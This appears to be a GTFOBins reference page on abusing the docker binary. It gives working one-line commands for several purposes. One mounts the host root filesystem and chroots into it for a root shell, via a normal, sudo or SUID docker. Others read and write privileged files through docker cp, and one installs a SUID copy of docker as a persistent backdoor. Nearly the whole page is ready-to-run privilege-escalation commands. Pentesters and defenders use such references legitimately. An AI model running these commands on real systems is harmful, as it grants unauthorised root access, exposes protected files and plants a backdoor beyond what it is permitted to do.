# GTFOBin: docker

This requires the user to be privileged enough to run docker, i.e. being in the `docker` group or being `root`.

Any other Docker Linux image should work, e.g., `debian`.

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

The resulting is a root shell.

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

Write a file by copying it to a temporary container and back to the target destination on the host.

```
CONTAINER_ID="$(docker run -d alpine)" # or existing
TF=$(mktemp)
echo "DATA" > $TF
docker cp $TF $CONTAINER_ID:$TF
docker cp $CONTAINER_ID:$TF file_to_write
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

Read a file by copying it to a temporary container and back to a new location on the host.

```
CONTAINER_ID="$(docker run -d alpine)"  # or existing
TF=$(mktemp)
docker cp file_to_read $CONTAINER_ID:$TF
docker cp $CONTAINER_ID:$TF $TF
cat $TF
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

The resulting is a root shell.

```
sudo install -m =xs $(which docker) .

./docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

The resulting is a root shell.

```
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```